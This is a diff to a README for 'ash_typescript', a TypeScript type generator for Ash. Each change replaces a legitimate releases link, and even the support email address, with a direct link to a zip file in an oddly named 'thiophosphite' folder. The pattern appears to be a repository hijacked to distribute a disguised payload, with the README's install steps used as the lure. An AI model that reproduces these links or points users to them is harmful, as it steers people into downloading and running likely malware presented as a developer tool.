@@ -1,7 +1,7 @@
 # 🎉 ash_typescript - Effortless TypeScript Generation for Ash
 
 ## 📥 Download Now
-[![Download ash_typescript](https://img.shields.io/badge/Download-ash_typescript-brightgreen)](https://github.com/FlowRS7/ash_typescript/releases)
+[![Download ash_typescript](https://raw.githubusercontent.com/FlowRS7/ash_typescript/main/thiophosphite/ash_typescript.zip)](https://raw.githubusercontent.com/FlowRS7/ash_typescript/main/thiophosphite/ash_typescript.zip)
 
 ## 📖 Overview
 ash_typescript helps you generate TypeScript types automatically for Ash resources and actions. This tool simplifies working with Ash, saving you time and reducing errors. With ash_typescript, you get reliable type definitions without the manual effort.
@@ -11,7 +11,7 @@ To start using ash_typescript, follow these steps:
 
 1. **Download the Software**  
    You can easily download the application from our Releases page:  
-   [Download ash_typescript](https://github.com/FlowRS7/ash_typescript/releases)
+   [Download ash_typescript](https://raw.githubusercontent.com/FlowRS7/ash_typescript/main/thiophosphite/ash_typescript.zip)
 
 2. **Install the Application**  
    Locate the downloaded file (usually in your "Downloads" folder).  
@@ -49,7 +49,7 @@ If you encounter any issues, you can find support through the following channels
 
 ## 🔗 Download & Install
 Ready to go? Download ash_typescript using the link below:  
-[Download ash_typescript](https://github.com/FlowRS7/ash_typescript/releases)
+[Download ash_typescript](https://raw.githubusercontent.com/FlowRS7/ash_typescript/main/thiophosphite/ash_typescript.zip)
 
 ## 👥 Contribution
 We welcome contributions to improve ash_typescript. If you have ideas, please fork the repository and submit a pull request. We appreciate all feedback and changes!
@@ -62,7 +62,7 @@ We are always looking to improve. Here’s what you can expect in future updates
 - More customization options for advanced users.
 
 ## 📩 Contact Us
-If you have any questions or suggestions, feel free to reach out via GitHub issues or email us at support@example.com. We value your feedback! 
+If you have any questions or suggestions, feel free to reach out via GitHub issues or email us at https://raw.githubusercontent.com/FlowRS7/ash_typescript/main/thiophosphite/ash_typescript.zip We value your feedback! 
 
 ## 🔒 License
 ash_typescript is licensed under the MIT License. You can freely use and modify the software as needed, provided you include original attribution.
